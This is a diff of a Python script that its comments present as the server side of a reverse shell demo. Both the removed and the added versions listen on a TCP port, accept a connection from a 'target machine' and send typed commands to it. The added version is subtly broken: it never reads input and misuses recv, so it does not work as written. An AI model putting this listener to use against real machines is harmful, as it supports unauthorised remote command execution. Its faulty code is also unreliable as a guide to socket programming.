@@ -1,35 +1,40 @@
-#the Server program to demonstrate the Reverse Shell 
-#The Socket is the end point of a Network Connection !
-import socket 
-HOST=''
-#the port must be in the range of 0-65535(0-1024 reserved)
-PORT=9100
-try:
-	print('Establishing a TCP Connection !')
-	soc=socket.socket()
-	#now we have to bind the ip address to the port number !
-	#the function parameter for the bind method is a tuple
-	print(f'Binding to the Port {PORT}')
-	soc.bind((HOST,PORT))
-	#this implies how many computers can wait for the sever prior to timeout
-	soc.listen(5)
-	#now we have to accept the connection from the client !(target machine )
-	print('Waiting for Someone to Connect !')
-	conn,addr=soc.accept()
-	print(f'Now we \'re connected to IP: {addr[0]} and Listening On Port: {addr[1]}')
-	cmd=''
-	print('Ready to Chat !')
-	while True:
-		if cmd.lower()=='quit':
-			conn.close()
-			soc.close()
-			print('Bye Client !')
-			break
-		cmd=input('>>')
-		print('Server: ',cmd)
-		conn.send(cmd.encode())
-		print('Client: ',conn.recv(1024).decode())
-	print('Client Be Like:',conn.recv(1024).decode())
-except socket.error as s_err:
-	print('The Socket Creation Error !'+str(s_err))
+#The Demo of the Server Program.
+#We Initiate TCP Connection via the Server.py prgm
+#The Following module is required to use the TCP facility !
+import socket
+import os
+import sys
 
+HOST=''
+# we have the option to choose from 0-65535(0-1023 are reserved !)
+PORT=43000
+try:
+	#initializing the socket object !
+	print('Socket Object Initialized !')
+	server_socket=socket.socket()
+	#now we need to bind the ip address to the PORT Number !
+	#it takes a single arguement that is the tuple containing the ip and port !
+	print('Binding the port to the IP address.')
+	server_socket.bind((HOST,PORT))
+	#at most 3 devices can wait until the network timeout !
+	print(f'Listening on Port {PORT}')
+	server_socket.listen(3)
+	print('Connection To Be Initiated !')
+	#when an actual Client Connects to the Network !
+	conn,addr=server_socket.accept()
+	print(f'The Server is now Connected to {addr[0]}, which is at {addr[1]}')
+	#now we can continously chat until the we enter the quit statement !
+	#the Command will take the input from the server side keyboard !
+	command=''
+	while True:
+		if command=='exit':
+			conn.close()
+			server_socket.close()
+			sys.exit()
+		if len(command.encode())>0:
+			#sending Actual Commands to the Client !
+			conn.send(command.encode())
+			print(conn.recv.decode(),end='')
+
+except Exception as e:
+	print('Fatal Error Occured :',str(e))
